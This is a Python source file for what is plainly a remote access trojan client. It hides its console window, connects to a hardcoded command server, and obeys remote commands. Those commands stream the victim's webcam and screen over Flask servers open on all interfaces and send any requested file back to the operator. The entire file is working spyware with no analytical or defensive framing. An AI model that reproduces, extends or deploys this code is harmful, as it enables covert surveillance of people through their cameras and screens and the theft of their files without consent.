import socket
import os
import ctypes
import threading
import cv2
import numpy as np
import pyautogui
import time
from datetime import datetime
from flask import Flask, render_template, Response

# Function to hide the CLI window (Windows only)
def hide_window():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Function to handle incoming server commands
def handle_server_commands(client_socket):
    while True:
        command = client_socket.recv(1024).decode('utf-8')
        if command == '!webcam_stream':
            stream_webcam(client_socket)
        elif command == '!screen_stream':
            stream_screen(client_socket)
        elif command.startswith('!download'):
            filename = command.split(" ")[1]
            send_file(client_socket, filename)
        elif command == '!exit':
            client_socket.close()
            break

# Stream webcam to server via Flask
def stream_webcam(client_socket):
    print("Webcam streaming started")
    app = Flask(__name__)

    # Capture webcam using OpenCV
    def gen_frames():
        cap = cv2.VideoCapture(0)  # Default webcam
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            _, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n\r\n')
        cap.release()

    @app.route('/video_feed')
    def video_feed():
        return Response(gen_frames(),
                        mimetype='multipart/x-mixed-replace; boundary=frame')

    # Start the web server to stream the webcam
    app.run(host='0.0.0.0', port=5000, threaded=True)

# Stream screen to server via Flask
def stream_screen(client_socket):
    print("Screen streaming started")
    app = Flask(__name__)

    # Capture screen using pyautogui
    def gen_frames():
        while True:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            _, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n\r\n')

    @app.route('/video_feed')
    def video_feed():
        return Response(gen_frames(),
                        mimetype='multipart/x-mixed-replace; boundary=frame')

    # Start the web server to stream the screen
    app.run(host='0.0.0.0', port=5001, threaded=True)

# Send file to server (via requests or socket)
def send_file(client_socket, filename):
    if os.path.exists(filename):
        with open(filename, 'rb') as file:
            data = file.read()
            client_socket.sendall(data)
        print(f"[+] Sending {filename}...")
    else:
        print(f"[-] File {filename} not found.")

def client_program():
    server_ip = "10.0.1.33"  # Example IP
    server_port = 9999
    hide_window()

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    threading.Thread(target=handle_server_commands, args=(client_socket,)).start()

if __name__ == "__main__":
    client_program()
